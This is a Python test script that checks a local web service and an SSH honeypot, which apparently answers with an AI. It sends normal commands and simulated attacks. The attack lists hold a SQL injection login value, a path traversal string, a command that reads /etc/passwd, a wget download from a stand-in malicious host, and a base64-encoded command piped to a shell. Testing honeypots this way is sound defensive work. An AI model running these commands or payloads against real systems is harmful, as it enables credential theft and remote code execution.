import paramiko
import requests
import time
import socket

def log(val):
    with open('test_results.txt', 'a', encoding='utf-8') as f:
        f.write(str(val) + '\\n')
    print(val)

def test_http_normal():
    log("\\n[HTTP] Normal Activity Testing")
    urls = ['http://127.0.0.1:8080/', 'http://127.0.0.1:8080/login']
    for url in urls:
        start = time.time()
        try:
            r = requests.get(url, timeout=2)
            elapsed = time.time() - start
            log(f"GET {url} - Status: {r.status_code} - Time: {elapsed*1000:.2f}ms")
            if elapsed > 0.2:
                log(f"  [!] Performance warning: took longer than 200ms!")
        except Exception as e:
            log(f"GET {url} - Error: {e}")

def test_http_attack():
    log("\\n[HTTP] Attack Simulation")
    url = 'http://127.0.0.1:8080/login'
    payloads = [
        {"username": "admin' OR '1'='1", "password": "password"},
        # Malformed format / fuzzing
        {"username": "../../../etc/passwd", "password": "password"}
    ]
    for data in payloads:
        start = time.time()
        try:
            r = requests.post(url, data=data, timeout=5)
            elapsed = time.time() - start
            log(f"POST {url} with {data['username']} - Status: {r.status_code} - Time: {elapsed*1000:.2f}ms")
        except Exception as e:
            log(f"POST {url} - Error: {e}")


class SSHSession:
    def __init__(self, host='127.0.0.1', port=2222, username='root', password='password'):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.shell = None

    def connect(self):
        try:
            self.client.connect(self.host, port=self.port, username=self.username, password=self.password, timeout=5)
            self.shell = self.client.invoke_shell()
            self.shell.settimeout(3.0)
            # Read initial banner
            time.sleep(0.5)
            if self.shell.recv_ready():
                self.shell.recv(4096)
            return True
        except Exception as e:
            log(f"SSH Connect Error: {e}")
            return False

    def execute(self, cmd, wait=0.5):
        if not self.shell:
            return "No shell"
        try:
            self.shell.send(cmd + "\\n")
            time.sleep(wait)
            out = ""
            while self.shell.recv_ready():
                out += self.shell.recv(4096).decode('utf-8', errors='ignore')
            
            # Clean up echo and prompt
            lines = out.split("\\n")
            response = "\\n".join([line for line in lines if cmd not in line and not line.strip().endswith("$") and not line.strip().endswith("#")])
            return out.strip()
        except Exception as e:
            return f"Error executing: {e}"

    def close(self):
        if self.client:
            self.client.close()

def test_ssh():
    log("\\n[SSH] Validating Normal, Context, and Attack Sequences")
    session = SSHSession()
    if not session.connect():
        log("Failed to connect to SSH honeypot")
        return

    # Normal commands
    log("\\nA. Normal Activity & Baseline")
    normal_cmds = ['whoami', 'pwd', 'ls -la']
    for cmd in normal_cmds:
        start = time.time()
        res = session.execute(cmd)
        elapsed = time.time() - start
        log(f"> {cmd} ({elapsed*1000:.2f}ms)\\n{res}")

    # Repeated Command Consistency
    log("\\nB. Repeated Command Consistency")
    for _ in range(3):
        start = time.time()
        res = session.execute("ls")
        elapsed = time.time() - start
        print(f"> ls ({elapsed*1000:.2f}ms) Output length: {len(res)}")

    # Edge Case Testing
    print("\\nC. Edge Case Testing")
    edge_cmds = ['cat /not_a_real_file.txt', 'ldd', 'pwd']
    for cmd in edge_cmds:
        start = time.time()
        res = session.execute(cmd)
        elapsed = time.time() - start
        print(f"> {cmd} ({elapsed*1000:.2f}ms)\\n{res}")

    # Integrity Check
    print("\\nE. Context Integrity Check")
    session.execute("cd /var/log")
    res = session.execute("pwd")
    print(f"> pwd after cd /var/log: {res}")

    # Attack Simulation
    print("\\nD. Attack Simulation")
    attacks = [
        "cat /etc/passwd",
        "wget http://malicious.com/bot.sh",
        "echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh"
    ]
    for cmd in list(attacks):
        start = time.time()
        res = session.execute(cmd, wait=1.5) # Wait longer for AI
        elapsed = time.time() - start
        print(f"> {cmd} ({elapsed*1000:.2f}ms)\\n{res}")

    session.close()


if __name__ == "__main__":
    test_http_normal()
    test_http_attack()
    test_ssh()
